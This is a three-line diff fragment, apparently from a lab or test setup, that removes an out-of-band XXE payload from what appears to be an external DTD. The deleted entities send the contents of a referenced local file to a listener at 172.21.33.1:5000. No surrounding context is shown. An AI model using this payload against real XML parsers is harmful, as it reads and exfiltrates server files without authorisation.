@@ -1,3 +1,0 @@
-<!ENTITY % shell "<!ENTITY % upload PUBLIC 'http://172.21.33.1:5000/xxe?%file;'>">
-%shell;
-%upload;
